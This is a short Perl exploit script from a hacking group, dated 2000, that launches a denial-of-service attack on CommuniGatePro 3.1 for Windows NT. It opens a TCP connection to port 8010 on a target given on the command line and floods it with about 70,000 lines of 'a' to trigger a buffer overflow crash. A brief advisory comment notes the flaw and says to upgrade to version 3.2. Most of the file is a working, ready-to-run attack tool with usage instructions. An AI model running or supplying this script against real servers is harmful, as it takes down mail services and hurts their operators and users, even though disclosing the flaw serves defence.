   #!/usr/bin/perl
   # :::::::::::::::::::::::::::::
   # :: r00tabega security labs ::
   # ::    www.r00tabega.com    ::
   # :::::::::::::::::::::::::::::
   #
   # DoS Attack against CommuniGatePro 3.1 for Windows NT
   # Exploit coded and discovered by bansh33 [bansh33@r00tabega.com]
   #
   # <advisory>
   # CommuniGate is an Internet messaging server application implementing
   # various services including SMTP, IMAP, and POP3.
   # It does, however, contain a simple buffer overflow as follows:
   # It listens for connections on port 8010 (http configuration from remote browser)
   # and crashes when sent 70,000 of "a" + "\r\n"
   # Solution: Upgrade to version 3.2
   # </advisory>
   #
   # <usage>
   # ./communigate.pl [remote server]
   # </usage>
   #
   # <greetz>
   # E-dub, Sys-Edit, ragnarox, sku||, Axtrex, busdr1v3r, Griffon, Tutor, Ashmodai
   # and my mommy and daddy cuz they make me drink my milk =)
   # </greetz>
   #
   # ---------------begin c0de-----------------------
   use Socket;
   if (!($ARGV[0])) {
       print "CommuniGatePro 3.1 DoS Attack [bansh33@r00tabega.com]\n";
       print "usage: ./communigate.pl [remote host]\n";
       exit;
   }
   print "Attempting DOS Attack to $ARGV[0]...\n";
   $host = $ARGV[0];
   $serverIP = inet_aton($host);
   $serverAddr = sockaddr_in(8010, $serverIP);
   socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
   if(connect(CLIENT, $serverAddr)) {
   for ($i = 0; $i < 70001; $i++) {

   send(CLIENT,"a\r\n",0);
   }
   print "Packets sent.  If all went correctly, CommuniGatePro has crashed on $host\n";
   print "CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\n";
   print "[www.r00tabega.com]\n"
   }
   else {
       print "Cannot connect to $host on port 8010!\n";
       print "CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\n";
       print "[www.r00tabega.com]\n"
   }
   #                    www.hack.co.za              [2000]#
